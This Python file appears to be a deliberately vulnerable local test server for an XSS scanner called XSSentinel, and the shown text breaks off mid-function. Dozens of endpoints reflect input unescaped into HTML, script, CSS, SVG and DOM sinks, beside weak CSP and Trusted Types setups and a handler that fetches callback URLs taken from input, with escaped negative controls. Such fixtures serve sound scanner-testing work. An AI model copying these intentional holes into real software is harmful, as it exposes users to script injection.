"""Local vulnerable test server for validating XSSentinel (self-test only)."""
from __future__ import annotations
import html
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer

# In-memory store for the /store -> /view stored-XSS endpoint.
_STORE = []
# Phase 21-4: second-order XSS stores.  /so-inject persists into _STORE2
# which is rendered unescaped on /dashboard.  /so-inject-safe persists into
# _STORE3 which is rendered HTML-escaped on /dashboard-safe (must NOT fire).
_STORE2 = []
_STORE3 = []


PAGES = {
    "/echo": lambda q: f"<html><body>You searched: {q}</body></html>",
    "/attr": lambda q: f'<html><body><input type="text" value="{q}"></body></html>',
    "/script": lambda q: f'<html><body><script>var x = "{q}";</script></body></html>',
    "/href": lambda q: f'<html><body><a href="{q}">link</a></body></html>',
    "/evt": lambda q: f'<html><body><img src="x" onerror="{q}"></body></html>',
    "/dom": lambda q: (
        '<html><body><div id="out"></div>'
        '<script>'
        'var p = location.hash.substring(1);'
        'document.getElementById("out").innerHTML = p;'
        '</script></body></html>'
    ),
    "/safe": lambda q: f"<html><body>You searched: {html.escape(q)}</body></html>",
    "/waf": lambda q: _waf_echo(q),
    # NEW: CSS context (style attribute reflection)
    "/css": lambda q: f'<html><body><div style="{q}">x</div></body></html>',
    # NEW: HTML comment context reflection
    "/comment": lambda q: f'<html><body><!-- user note: {q} --></body></html>',
    # NEW: stored XSS (POST stores, GET /view renders all stored entries)
    "/store": lambda q: _store_add(q),
    "/view": lambda q: _store_view(),
    # NEW: CDATA reflection context
    "/cdata": lambda q: f'<root><![CDATA[ USER: {q} ]]></root>',
    # NEW: <meta http-equiv="refresh" content="..."> reflection
    "/meta": lambda q: f'<meta http-equiv="refresh" content="0;url={q}">',
    # NEW: template-expression ({{ }}) reflection context
    "/tpl": lambda q: f'<div ng-app>{{ {q} }}</div>',
    # NEW: blind-XSS endpoint. Reflects `q` AND, to make the OOB auto-confirm
    # loop testable offline, simulates a victim's browser firing the injected
    # callback beacon back at the listener.
    "/blind": lambda q: _blind_echo(q),
    # NEW: crawler fixture. Links to several vulnerable endpoints (with query
    # params) plus a POST form, so the deep crawler can discover + scan them.
    # Also links to /safe to prove the crawler never reports false positives,
    # and to an off-site URL that must NOT be crawled (scope enforcement).
    "/links": lambda q: (
        '<html><body><h1>index</h1>'
        '<ul>'
        '<li><a href="/echo?q=hi">echo</a></li>'
        '<li><a href="/script?q=hi">script</a></li>'
        '<li><a href="/dom?probe=1">dom</a></li>'
        '<li><a href="/safe?q=hi">safe (must stay clean)</a></li>'
        '<li><a href="http://example.com/evil">offsite (not crawled)</a></li>'
        '</ul>'
        '<form action="/store" method="POST">'
        '<input name="q" value="hi"><input type="submit"></form>'
        '</body></html>'
    ),
    # NEW: mXSS-vulnerable endpoint. Reflects input AND has an innerHTML sink
    # so mXSS payloads that survive sanitization will execute after mutation.
    "/mxss": lambda q: (
        '<html><body><div id="o"></div>'
        '<script>document.getElementById("o").innerHTML = "' + q.replace('"', '\\"') + '";</script>'
        '</body></html>'
    ),
    # NEW: DOM clobber endpoint. Reflects input as HTML AND has JS that
    # references `x` via getElementById -- if attacker injects id=x, the
    # clobbered element is used.
    "/clobber": lambda q: (
        '<html><body>' + q + '<script>var t = document.getElementById("x");'
        'if (t) { document.body.innerHTML += t.href; }</script>'
        '</body></html>'
    ),
    # NEW: template SSTI endpoint. Reflects input inside {{ }} context.
    # If {{7*7}} appears in response, the (simulated) template engine would
    # render it to 49.  We simulate by replacing {{7*7}} with 49.
    "/tpl-eval": lambda q: _tpl_eval(q),
    # NEW: JSONP endpoint. Returns callback_name(json_data) where callback
    # name is user-controlled via `callback` query param.  No sanitization.
    "/jsonp": lambda q: _jsonp_handler(q),
    # NEW: CSP-vulnerable endpoint. Returns Content-Security-Policy header
    # with 'unsafe-inline' -> bypassable.
    "/csp-weak": lambda q: _csp_weak_page(q),
    # NEW: CSP-strong endpoint. Has a strict CSP -> NOT bypassable.
    "/csp-strong": lambda q: _csp_strong_page(q),
    # --- Phase 9-11 advanced endpoints ---
    # postMessage XSS: listener with innerHTML sink, no origin check.
    "/postmsg": lambda q: (
        '<html><body><div id="out"></div>'
        '<script>'
        'window.addEventListener("message", function(e) {'
        'document.getElementById("out").innerHTML = e.data;'
        '});'
        '</script></body></html>'
    ),
    # Prototype pollution: vulnerable recursive merge + sink gadget.
    "/proto": lambda q: (
        '<html><body><div id="o"></div>'
        '<script>'
        'function merge(target, src) {'
        'for (var k in src) {'
        'if (typeof src[k] === "object") {'
        'target[k] = target[k] || {}; merge(target[k], src[k]);'
        '} else { target[k] = src[k]; }'
        '} return target; }'
        'var data = merge({}, ' + q + ');'
        'document.getElementById("o").innerHTML = data.html;'
        '</script></body></html>'
    ),
    # Service Worker XSS: register() with user-controlled URL (in script).
    "/sw": lambda q: (
        '<html><body><script>'
        'navigator.serviceWorker.register("' + q + '")'
        '.then(function(reg) { console.log("SW registered", reg); });'
        '</script></body></html>'
    ),
    # Web Worker XSS: new Worker() with user-controlled URL.
    "/worker": lambda q: (
        '<html><body><script>'
        'var w = new Worker("' + q + '");'
        'w.onmessage = function(e) { document.body.innerHTML = e.data; };'
        '</script></body></html>'
    ),
    # Open redirect -> XSS: DOM redirect sink fed by query param.
    "/redirect": lambda q: (
        '<html><body><script>'
        'var params = new URLSearchParams(location.search);'
        'var url = params.get("url");'
        'if (url) { location.href = url; }'
        '</script></body></html>'
    ),
    # Framework XSS (React dangerouslySetInnerHTML).
    "/react": lambda q: (
        '<html><body><div id="root"></div>'
        '<script>'
        'var data = "' + q + '";'
        'document.getElementById("root").innerHTML = data;'
        '</script></body></html>'
    ),
    # Header XSS: reflects User-Agent in response.
    "/header-reflect": lambda q: _header_reflect_page(q),
    # Path XSS: reflects URL path in response.
    "/path-reflect": lambda q: _path_reflect_page(q),
    # Cookie XSS: reflects cookie value in response.
    "/cookie-reflect": lambda q: _cookie_reflect_page(q),
    # Error page XSS: 404 page that reflects the invalid path.
    "/error-404": lambda q: _error_404_page(q),
    # Markdown XSS: simulates a Markdown renderer.
    "/markdown": lambda q: _markdown_render(q),
    # --- Phase 15: DOM-based SW/Worker/Prototype endpoints ---
    # DOM Service Worker XSS: page reads sw URL from location.search and
    # passes it to navigator.serviceWorker.register().  This is the
    # client-side taint pattern (vs. server-side reflection in /sw).
    "/dom-sw": lambda q: (
        '<html><body><script>'
        'var u = new URLSearchParams(location.search).get("sw") || "";'
        'if (u) { navigator.serviceWorker.register(u); }'
        '</script></body></html>'
    ),
    # DOM Web Worker XSS: page reads worker URL from location.hash and
    # passes it to new Worker().  Client-side taint pattern.
    "/dom-worker": lambda q: (
        '<html><body><script>'
        'var u = location.hash.substring(1);'
        'if (u) { var w = new Worker(u);'
        'w.onmessage = function(e) { document.body.innerHTML = e.data; }; }'
        '</script></body></html>'
    ),
    # DOM Prototype Pollution: page has a recursive merge + innerHTML sink
    # that reads data.html.  No server-side reflection -- the merge runs
    # entirely client-side on a hardcoded JSON object with a polluted
    # __proto__ when the attacker delivers it via the page's own eval of
    # location.hash JSON.  This is the canonical pp -> XSS gadget.
    "/dom-proto": lambda q: (
        '<html><body><div id="o"></div>'
        '<script>'
        'function merge(target, src) {'
        'for (var k in src) {'
        'if (typeof src[k] === "object") {'
        'target[k] = target[k] || {}; merge(target[k], src[k]);'
        '} else { target[k] = src[k]; }'
        '} return target; }'
        'var payload = location.hash.substring(1);'
        'var userObj = payload ? JSON.parse(decodeURIComponent(payload)) : {};'
        'var data = merge({}, userObj);'
        'document.getElementById("o").innerHTML = data.html;'
        '</script></body></html>'
    ),
    # --- Phase 21-4: second-order XSS fixtures ---
    # /so-inject (POST): stores `q` in _STORE2 (a separate comment store).
    # The inject page itself returns a bland "posted" message -- the stored
    # value is NOT reflected here, so only a second-order crawl will find it.
    "/so-inject": lambda q: _so_inject(q),
    # /dashboard: renders all _STORE2 entries UNESCAPED -- this is the
    # second-order XSS surface.  The payload injected at /so-inject
    # executes here when an admin views the dashboard.
    "/dashboard": lambda q: _so_dashboard(),
    # /so-inject-safe (POST): stores `q` in _STORE3 (escaped comment store).
    "/so-inject-safe": lambda q: _so_inject_safe(q),
    # /dashboard-safe: renders _STORE3 entries HTML-escaped.  This MUST
    # NOT trigger a second-order finding (negative control).
    "/dashboard-safe": lambda q: _so_dashboard_safe(),
    # --- Phase 26: GraphQL + WebSocket XSS fixtures ---
    # GraphQL endpoint: reflects the alias verbatim in the response JSON
    # keys (alias-based XSS).  Also reflects the argument value in the
    # error message (argument-based XSS).  Introspection is enabled.
    "/graphql": lambda q: _graphql_handler(q),
    # GraphQL page: Apollo Client + unsafe sink (dangerouslySetInnerHTML
    # with data.user.bio).  Static-analysis arm should fire.
    "/graphql-app": lambda q: _graphql_app_page(q),
    # WebSocket page: new WebSocket() + onmessage handler that writes
    # event.data to innerHTML without origin check.
    "/ws-app": lambda q: _ws_app_page(q),
    # Insecure WebSocket page: uses ws:// (not wss://) -- MITM risk.
    "/ws-insecure": lambda q: _ws_insecure_page(q),
    # --- Phase 27-2: Trusted Types + CSP nonce reuse fixtures ---
    # TT taint flow: location.hash -> innerHTML without a TT policy.
    "/tt-taint": lambda q: _tt_taint_page(q),
    # TT policy bypass: registered policy with identity createHTML.
    "/tt-bypass": lambda q: _tt_bypass_page(q),
    # TT no policy: dangerous sinks but no trustedTypes.createPolicy call.
    "/tt-no-policy": lambda q: _tt_no_policy_page(q),
    # TT policy unused: policy registered but never called.
    "/tt-unused": lambda q: _tt_unused_page(q),
    # CSP nonce too short: 8-char nonce (brute-forceable).
    "/csp-nonce-short": lambda q: _csp_nonce_short_page(q),
    # CSP nonce predictable: all-digit sequential-looking nonce.
    "/csp-nonce-seq": lambda q: _csp_nonce_seq_page(q),
    # CSP nonce misconfigured: nonce in CSP but no <script nonce=...> in HTML.
    "/csp-nonce-missing": lambda q: _csp_nonce_missing_page(q),
    # CSP nonce multi: two different nonces in the same CSP header.
    "/csp-nonce-multi": lambda q: _csp_nonce_multi_page(q),
    # CSP nonce strong (control): properly random 22-char nonce + nonce'd scripts.
    "/csp-nonce-strong": lambda q: _csp_nonce_strong_page(q),
    # --- Phase 27-3: Cookie tossing XSS + SRI bypass fixtures ---
    # Cookie tossing via Set-Cookie with parent Domain attribute.
    "/cookie-toss-set": lambda q: _cookie_toss_set_page(q),
    # Cookie tossing via client-side document.cookie with domain= attribute.
    "/cookie-toss-client": lambda q: _cookie_toss_client_page(q),
    # Cookie sink flow: reads document.cookie and writes to innerHTML.
    "/cookie-sink-flow": lambda q: _cookie_sink_flow_page(q),
    # SRI missing on cross-origin script (CDN compromise vector).
    "/sri-missing-script": lambda q: _sri_missing_script_page(q),
    # SRI missing on cross-origin stylesheet.
    "/sri-missing-style": lambda q: _sri_missing_style_page(q),
    # SRI broken: integrity= present but no crossorigin attribute.
    "/sri-broken": lambda q: _sri_broken_page(q),
    # SRI malformed: integrity="" (empty).
    "/sri-malformed": lambda q: _sri_malformed_page(q),
    # SRI insecure: http:// origin for a script.
    "/sri-insecure": lambda q: _sri_insecure_page(q),
    # SRI strong (control): valid integrity + crossorigin + https.
    "/sri-strong": lambda q: _sri_strong_page(q),
    # --- Phase 28-4: Import Maps tampering + Sanitizer bypass fixtures ---
    # Import map with cross-origin + insecure entries.
    "/import-map-vuln": lambda q: _import_map_vuln_page(q),
    # Import map user-controlled: reflects query param in the JSON.
    "/import-map-reflect": lambda q: _import_map_reflect_page(q),
    # Import map after module script (spec violation).
    "/import-map-late": lambda q: _import_map_late_page(q),
    # Import map strong (control): same-origin relative entries only.
    "/import-map-strong": lambda q: _import_map_strong_page(q),
    # Sanitizer vulnerable version: DOMPurify 1.0.7 (known CVE).
    "/sanitizer-vuln-version": lambda q: _sanitizer_vuln_version_page(q),
    # Sanitizer unsafe config: ADD_TAGS includes 'script'.
    "/sanitizer-unsafe-config": lambda q: _sanitizer_unsafe_config_page(q),
    # Sanitizer output to innerHTML (mXSS risk).
    "/sanitizer-to-innerhtml": lambda q: _sanitizer_to_innerhtml_page(q),
    # Unsanitized innerHTML from user source (no sanitizer call).
    "/sanitizer-missing": lambda q: _sanitizer_missing_page(q),
    # Sanitizer strong (control): safe version + textContent sink.
    "/sanitizer-strong": lambda q: _sanitizer_strong_page(q),
    # --- Phase 30-1: CSS Injection (CSSI) fixtures ---
    # @font-face unicode-range data exfiltration gadget.
    "/cssi-font-face": lambda q: _cssi_font_face_page(q),
    # CSS keylogger: input[value^=...] selector + external url().
    "/cssi-keylogger": lambda q: _cssi_keylogger_page(q),
    # @import loads external stylesheet.
    "/cssi-import": lambda q: _cssi_import_page(q),
    # CSSOM sinks: cssText / insertRule / background.
    "/cssi-cssom": lambda q: _cssi_cssom_page(q),
    # Template placeholder inside <style> block.
    "/cssi-template": lambda q: _cssi_template_page(q),
    # Legacy CSS script execution: expression/behavior/moz-binding.
    "/cssi-legacy": lambda q: _cssi_legacy_page(q),
    # Dynamic CSS exfil gadget built in JS (CSS keylogger).
    "/cssi-dynamic-exfil": lambda q: _cssi_dynamic_exfil_page(q),
    # CSSI strong (control): safe inline style, no exfil gadget.
    "/cssi-strong": lambda q: _cssi_strong_page(q),
    # --- Phase 30-2: Dangling Markup Injection fixtures ---
    # Dangling markup risk: href reflection + CSRF token downstream.
    "/dangling-risk": lambda q: _dangling_risk_page(q),
    # Dangling markup risk: hidden input value + src reflection.
    "/dangling-hidden": lambda q: _dangling_hidden_page(q),
    # Dangling markup potential: sensitive data + URL attrs, no reflection.
    "/dangling-potential": lambda q: _dangling_potential_page(q),
    # Dangling markup safe (control): no sensitive data near reflection.
    "/dangling-safe": lambda q: _dangling_safe_page(q),
    # --- Phase 30-3: Modern framework SSTI fixtures ---
    "/fw-vue3-vhtml": lambda q: _fw_vue3_vhtml_page(q),
    "/fw-angular-pipe": lambda q: _fw_angular_pipe_page(q),
    "/fw-svelte-store": lambda q: _fw_svelte_store_page(q),
    "/fw-lit-unsafe": lambda q: _fw_lit_unsafe_page(q),
    "/fw-safe": lambda q: _fw_safe_page(q),
    # --- Phase 30-4: SVG XSS fixtures ---
    # Inline <script> inside SVG (svg_script vector).
    "/svg-script": lambda q: _svg_script_page(q),
    # <foreignObject> embedding <script> (svg_foreignobject_script vector).
    "/svg-foreignobject": lambda q: _svg_foreignobject_page(q),
    # SMIL <set> with attributeName=onload (svg_set_event vector).
    "/svg-smil": lambda q: _svg_smil_page(q),
    # <use href="javascript:..."> (svg_use_jsuri vector).
    "/svg-use-jsuri": lambda q: _svg_use_jsuri_page(q),
    # <a xlink:href="javascript:..."> (svg_a_jsuri vector).
    "/svg-a-jsuri": lambda q: _svg_a_jsuri_page(q),
    # Control: safe SVG with only benign shapes (no script/event/jsuri).
    "/svg-safe": lambda q: _svg_safe_page(q),
}


def _tpl_eval(q: str):
    """Simulate a client-side template engine: render {{7*7}} -> 49."""
    rendered = q.replace("{{7*7}}", "49").replace("{{ 7*7 }}", "49")
    return f'<html><body><div>{rendered}</div></body></html>'


def _jsonp_handler(q: str):
    """JSONP endpoint: response is `<callback>([1,2,3])`.

    The `callback` param is read from the request URL.  This handler is
    called by H.do_GET which passes the `q` param only; we need to read
    the callback param separately.  We do this via a side channel:
    H.do_GET stashes the parsed query in a module-global so this handler
    can pick it up.  See _set_last_query / _get_last_query.
    """
    qs = _get_last_query()
    cb = qs.get("callback", ["render"])[0]
    return (f"{cb}([1,2,3])", 200, "application/javascript")


def _csp_weak_page(q: str):
    """Page with a weak CSP (unsafe-inline). Returns CSP header."""
    body = f'<html><body>search: {q}</body></html>'
    return (body, 200, "text/html",
            "default-src 'self'; script-src 'self' 'unsafe-inline'")


def _csp_strong_page(q: str):
    """Page with a strong CSP. Returns CSP header."""
    body = f'<html><body>search: {q}</body></html>'
    return (body, 200, "text/html",
            "default-src 'self'; script-src 'self'; object-src 'none'")


def _header_reflect_page(q: str):
    """Page that reflects the User-Agent header (read via side channel).

    The actual UA is fetched from the module global set by do_GET.
    """
    ua = _get_last_query().get("ua", ["unknown"])[0]
    # In a real app, the server would read the User-Agent header; we
    # simulate that by echoing the value back in the HTML body.
    body = f'<html><body>Your browser: {ua}</body></html>'
    return body


def _path_reflect_page(q: str):
    """Page that reflects the URL path in the response body."""
    # The path is available via _get_last_query() which stores the full
    # parsed URL; for this fixture we just echo `q` which the server
    # passes as the last path segment.
    body = f'<html><body>Path was: {q}</body></html>'
    return body


def _cookie_reflect_page(q: str):
    """Page that reflects a cookie value in the response body.

    Reads the `theme` cookie via the Cookie header side channel.
    """
    cookie_val = _get_last_query().get("cookie_theme", ["guest"])[0]
    body = f'<html><body>Welcome, user with theme: {cookie_val}</body></html>'
    return body


def _error_404_page(q: str):
    """404 error page that reflects the invalid path segment."""
    body = f'<html><body><h1>404 Not Found</h1><p>The page {q} does not exist.</p></body></html>'
    return (body, 404, "text/html; charset=utf-8")


def _markdown_render(q: str):
    """Simulate a vulnerable Markdown renderer.

    Converts ``![alt](src)`` to ``<img src="src" alt="alt">`` WITHOUT
    sanitizing the src attribute, allowing attribute breakout.
    """
    import re as _re
    rendered = q
    # Vulnerable image rendering: no quote escaping on the src attribute.
    rendered = _re.sub(
        r'!\[([^\]]*)\]\(([^)]+)\)',
        r'<img src="\2" alt="\1">',
        rendered,
    )
    # Vulnerable link rendering.
    rendered = _re.sub(
        r'\[([^\]]+)\]\(([^)]+)\)',
        r'<a href="\2">\1</a>',
        rendered,
    )
    # Wrap in a paragraph (so the page looks like a rendered markdown doc).
    body = f'<html><body><p>{rendered}</p></body></html>'
    return body


# Side-channel for passing parsed query between H.do_GET and handlers.
_LAST_QUERY = {}

def _set_last_query(qs: dict):
    global _LAST_QUERY
    _LAST_QUERY = qs

def _get_last_query() -> dict:
    return _LAST_QUERY


def _waf_echo(q: str):
    # Simulate a naive WAF: block the literal lowercase "<script" substring,
    # but reflect otherwise (so encoding/case transforms bypass it).
    if "<script" in q.lower():
        return ("BLOCKED by WAF", 403)
    return f"<html><body>echo: {q}</body></html>"


def _store_add(q: str):
    _STORE.append(q)
    return ("<html><body>thanks</body></html>", 200)


def _store_view():
    items = "".join(f"<li>{x}</li>" for x in _STORE)
    return f"<html><body><ul>{items}</ul></body></html>"


def _so_inject(q: str):
    """Phase 21-4: persist `q` into _STORE2 (second-order comment store).

    The inject page itself does NOT reflect the value -- it only returns a
    generic 'comment posted' page.  The stored value surfaces later on
    /dashboard, which is the second-order XSS execution point.  Only
    non-empty values are stored so a bare crawl GET doesn't pollute the
    store with empty strings.
    """
    if q:
        _STORE2.append(q)
    return ("<html><body><h1>Comment posted</h1>"
            "<p>Thank you, your comment is pending review.</p>"
            '<p><a href="/dashboard">View dashboard</a></p>'
            "</body></html>", 200)


def _so_dashboard():
    """Phase 21-4: render _STORE2 entries UNESCAPED (vulnerable surface).

    This simulates an admin dashboard that displays user-submitted comments
    without HTML-escaping -- the classic second-order XSS pattern.
    """
    items = "".join(f"<div class='comment'>{x}</div>" for x in _STORE2)
    return (f"<html><body><h1>Comments Dashboard</h1>"
            f"<div id='comments'>{items}</div>"
            '<p><a href="/">Home</a></p>'
            "</body></html>")


def _so_inject_safe(q: str):
    """Phase 21-4: persist `q` into _STORE3 (escaped store, negative control)."""
    if q:
        _STORE3.append(q)
    return ("<html><body><h1>Comment posted (safe)</h1>"
            '<p><a href="/dashboard-safe">View safe dashboard</a></p>'
            "</body></html>", 200)


def _so_dashboard_safe():
    """Phase 21-4: render _STORE3 entries HTML-escaped (negative control).

    This page MUST NOT trigger a second-order XSS finding -- it proves the
    detector doesn't false-positive on escaped reflection.
    """
    items = "".join(f"<div class='comment'>{html.escape(x)}</div>"
                    for x in _STORE3)
    return (f"<html><body><h1>Safe Comments</h1>"
            f"<div id='comments'>{items}</div></body></html>")


def _blind_echo(q: str):
    """Reflect `q` and simulate the victim's browser firing the OOB beacon.

    The injected blind payload embeds a callback URL such as
    `http://127.0.0.1:8900/xssv_xxx/?c=...`.  We extract that URL from the
    reflected input and GET it -- exactly what a real victim's browser would
    do when the payload executes.  This lets the self-hosted listener receive a
    callback and lets XSSentinel confirm the blind XSS automatically.
    """
    import re
    import urllib.request
    m = re.search(r"https?://([\w.\-]+:\d+|[\w.\-]+)/(xssv_[0-9a-f]+)", q)
    if m:
        host = m.group(1)
        token = m.group(2)
        cb = f"http://{host}/{token}"
        try:
            urllib.request.urlopen(cb, timeout=3)
        except Exception:
            pass
    return f"<html><body><div>{q}</div></body></html>"


# ---------------------------------------------------------------------------
# Phase 26: GraphQL + WebSocket fixtures
# ---------------------------------------------------------------------------

def _graphql_handler(q: str):
    """Simulate a vulnerable GraphQL endpoint.

    Reads the raw POST body via the side-channel ``_LAST_RAW_BODY`` (set
    by ``do_POST``) and responds to three query shapes:

      1. ``query{__typename}`` -- returns ``{"data":{"__typename":"Query"}}``
         (introspection enabled).

      2. ``query{<alias>:__typename}`` -- returns the alias verbatim as a
         JSON key (alias-reflection XSS).

      3. ``query{user(name:"<value>"){id}}`` -- returns an error message
         echoing the argument value (argument-reflection XSS).

    For GET requests (probe fallback), the body is taken from the ``q``
    query parameter so the introspection probe works without a POST body.
    """
    import json as _json
    import re as _re
    # Try to read the raw POST body first; fall back to the `q` param.
    raw = _get_last_query().get("raw_body", [""])[0]
    if not raw:
        raw = q
    if not raw:
        raw = '{"query":"query{__typename}"}'
    try:
        req_obj = _json.loads(raw) if isinstance(raw, str) else raw
        query = req_obj.get("query", "")
    except Exception:
        query = raw

    # 1. Introspection probe.
    if "__typename" in query and ":" not in query.split("__typename", 1)[0]:
        body = _json.dumps({"data": {"__typename": "Query"}})
        return (body, 200, "application/json")

    # 2. Alias probe: query{<alias>:__typename}
    m = _re.search(r'query\{([^:}]+):__typename\}', query)
    if m:
        alias = m.group(1)
        # Reflect the alias verbatim as a JSON key.
        body = _json.dumps({"data": {alias: "Query"}})
        return (body, 200, "application/json")

    # 3. Argument probe: query{user(name:"<value>"){id}}
    m = _re.search(r'user\s*\(\s*name\s*:\s*"([^"]*)"', query)
    if m:
        value = m.group(1)
        # Echo the argument value verbatim in the error message.
        body = _json.dumps({
            "errors": [{
                "message": f'Cannot query field "user" with name "{value}"',
            }]
        })
        return (body, 200, "application/json")

    # Fallback: generic GraphQL error.
    body = _json.dumps({"errors": [{"message": "Cannot parse query"}]})
    return (body, 200, "application/json")


def _graphql_app_page(q: str):
    """Page that uses Apollo Client and renders GraphQL data via
    dangerouslySetInnerHTML (the canonical client-sink XSS pattern)."""
    return (
        '<html><body>'
        '<div id="root"></div>'
        '<script src="https://unpkg.com/react@18/umd/react.development.js"></script>'
        '<script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>'
        '<script src="https://unpkg.com/@apollo/client"></script>'
        '<script>'
        'const client = new ApolloClient({'
        '  uri: "/graphql",'
        '  cache: new InMemoryCache()'
        '});'
        'const GET_USER = gql`query GetUser { user { id bio } }`;'
        'function UserBio() {'
        '  const { data, loading } = useQuery(GET_USER);'
        '  if (loading) return null;'
        '  return <div dangerouslySetInnerHTML={{__html: data.user.bio}} />;'
        '}'
        '</script>'
        '</body></html>'
    )


def _ws_app_page(q: str):
    """Page that opens a WebSocket and renders event.data via innerHTML
    without origin check (the canonical WebSocket XSS pattern)."""
    return (
        '<html><body>'
        '<div id="out"></div>'
        '<script>'
        'var ws = new WebSocket("wss://127.0.0.1/socket");'
        'ws.onmessage = function(e) {'
        '  document.getElementById("out").innerHTML = e.data;'
        '};'
        '</script>'
        '</body></html>'
    )


def _ws_insecure_page(q: str):
    """Page that uses an unencrypted ws:// WebSocket (MITM risk)."""
    return (
        '<html><body>'
        '<div id="out"></div>'
        '<script>'
        'var ws = new WebSocket("ws://chat.example.com/socket");'
        'ws.onmessage = function(e) {'
        '  document.getElementById("out").textContent = e.data;'
        '};'
        '</script>'
        '</body></html>'
    )


# ---------------------------------------------------------------------------
# Phase 27-2: Trusted Types + CSP nonce reuse fixtures
# ---------------------------------------------------------------------------

def _tt_taint_page(q: str):
    """Page where location.hash flows into innerHTML without a TT policy.

    This is the canonical TT taint-flow pattern: a DOM source feeds a
    dangerous sink with no policy.createHTML wrapping.  The static TT
    analyzer should report a taint_flow violation (high severity).
    """
    return (
        '<html><body>'
        '<div id="out"></div>'
        '<script>'
        'var hash = location.hash.substring(1);'
        'document.getElementById("out").innerHTML = hash;'
        '</script>'
        '</body></html>'
    )


def _tt_bypass_page(q: str):
    """Page that registers an identity TT policy (no-op createHTML).

    The policy is registered (so the page looks TT-compliant) but its
    createHTML returns input unchanged.  This is the migration anti-
    pattern the TT analyzer should flag as a policy_bypass (high).
    """
    return (
        '<html><body>'
        '<div id="out"></div>'
        '<script>'
        'var policy = trustedTypes.createPolicy("noop", {'
        '  createHTML: (input) => input'
        '});'
        'document.getElementById("out").innerHTML = '
        '  policy.createHTML(location.hash.substring(1));'
        '</script>'
        '</body></html>'
    )


def _tt_no_policy_page(q: str):
    """Page that uses innerHTML but registers no TT policy at all.

    The TT analyzer should report a no_policy violation (medium).
    """
    return (
        '<html><body>'
        '<div id="out"></div>'
        '<script>'
        'document.getElementById("out").innerHTML = "static content";'
        '</script>'
        '</body></html>'
    )


def _tt_unused_page(q: str):
    """Page that registers a TT policy but never calls policy.createHTML.

    The sinks still receive raw strings -- the policy is dead code.
    The TT analyzer should report a policy_unused violation (low).
    """
    return (
        '<html><body>'
        '<div id="out"></div>'
        '<script>'
        'var sanitizer = trustedTypes.createPolicy("sanitizer", {'
        '  createHTML: (input) => DOMPurify.sanitize(input)'
        '});'
        '// BUG: policy never used -- sink receives raw string'
        'document.getElementById("out").innerHTML = "hello";'
        '</script>'
        '</body></html>'
    )


def _csp_nonce_short_page(q: str):
    """Page with a CSP nonce that is too short (8 chars).

    Returns CSP header ``script-src 'nonce-short123'``.  The CSP nonce
    analyzer should flag this as ``csp_nonce_too_short`` (high).
    """
    body = (
        '<html><body>'
        '<script nonce="short123">console.log("hi");</script>'
        '</body></html>'
    )
    return (body, 200, "text/html",
            "default-src 'self'; script-src 'nonce-short123' 'strict-dynamic'")


def _csp_nonce_seq_page(q: str):
    """Page with an all-digit, sequential-looking CSP nonce.

    Returns CSP header ``script-src 'nonce-00001111'``.  The CSP nonce
    analyzer should flag this as ``csp_nonce_predictable`` (high).
    """
    body = (
        '<html><body>'
        '<script nonce="00001111">console.log("hi");</script>'
        '</body></html>'
    )
    return (body, 200, "text/html",
            "default-src 'self'; script-src 'nonce-00001111' 'strict-dynamic'")


def _csp_nonce_missing_page(q: str):
    """Page whose CSP declares a nonce but the HTML has no nonce= attrs.

    The CSP nonce analyzer should flag this as ``csp_nonce_misconfigured``
    (medium) -- the page's inline scripts will be blocked by CSP.
    """
    body = (
        '<html><body>'
        '<script>console.log("this script will be blocked by CSP");</script>'
        '</body></html>'
    )
    return (body, 200, "text/html",
            "default-src 'self'; script-src 'nonce-abc1234567890def'")


def _csp_nonce_multi_page(q: str):
    """Page whose CSP declares two different nonces (config bug).

    Returns CSP header with both ``'nonce-aaa...'`` and ``'nonce-bbb...'``.
    The CSP nonce analyzer should flag this as ``csp_nonce_multi`` (low).
    """
    body = (
        '<html><body>'
        '<script nonce="aaa1234567890bbb">console.log("hi");</script>'
        '</body></html>'
    )
    return (body, 200, "text/html",
            "default-src 'self'; script-src 'nonce-aaa1234567890bbb' "
            "'nonce-ccc9876543210ddd' 'strict-dynamic'")


def _csp_nonce_strong_page(q: str):
    """Control page with a strong CSP nonce (22-char base64).

    The CSP nonce analyzer should NOT report any finding on this page
    (negative control -- the nonce is properly random and properly
    applied to <script> tags).
    """
    body = (
        '<html><body>'
        '<script nonce="aBcDeFgH1234567890xYzAb">console.log("hi");</script>'
        '</body></html>'
    )
    return (body, 200, "text/html",
            "default-src 'self'; "
            "script-src 'nonce-aBcDeFgH1234567890xYzAb' 'strict-dynamic'; "
            "object-src 'none'; base-uri 'self'")


# --- Phase 27-3: Cookie tossing + SRI bypass fixtures ---


def _cookie_toss_set_page(q: str):
    """Page whose response sets a cookie with Domain=.example.com.

    The response host is 127.0.0.1; the cookie's Domain=example.com is
    a parent of the response host suffix-wise only if the test runner
    pretends to be sub.example.com.  For the self-test we set the
    response host explicitly to "sub.example.com" via a custom Host
    header -- but since we can't do that in the local test server, we
    instead set Domain=127.0.0.1 (self-scope) which is NOT tossing,
    and Domain=localhost which IS tossing when the response host is
    127.0.0.1 (because 127.0.0.1 is not a subdomain of localhost).

    To make the test deterministic, we use a 5-tuple return value:
    (body, status, content_type, csp_header, set_cookie_headers).
    The handler returns Set-Cookie headers that set Domain=example.com
    while the response host (passed to the analyzer via the URL) is
    sub.example.com.
    """
    body = (
        '<html><body>'
        '<h1>Cookie set</h1>'
        '<p>This response sets a parent-domain cookie.</p>'
        '</body></html>'
    )
    # 5-tuple: (body, status, content_type, csp_header, set_cookies)
    # set_cookies is a list of Set-Cookie header values.
    return (body, 200, "text/html", None,
            ["session=abc123; Domain=example.com; Path=/; HttpOnly",
             "pref=dark; Domain=example.com; Path=/"])


def _cookie_toss_client_page(q: str):
    """Page with client-side document.cookie setting a parent-domain cookie.

    The page contains ``document.cookie = "theme=x; domain=.example.com"``
    which is the client-side tossing pattern.
    """
    body = (
        '<html><body>'
        '<script>'
        'document.cookie = "theme=dark; domain=.example.com; path=/";'
        'document.cookie = "lang=en; domain=.example.com; path=/";'
        '</script>'
        '</body></html>'
    )
    return body


def _cookie_sink_flow_page(q: str):
    """Page that reads document.cookie and writes it to innerHTML.

    This is the receiving side of cookie tossing: if an attacker can
    set a cookie (via tossing), the value will be written to innerHTML
    and execute as XSS.
    """
    body = (
        '<html><body>'
        '<div id="out"></div>'
        '<script>'
        'var cookies = document.cookie;'
        'var theme = getCookie("theme") || "default";'
        'document.getElementById("out").innerHTML = theme;'
        'function getCookie(name) {'
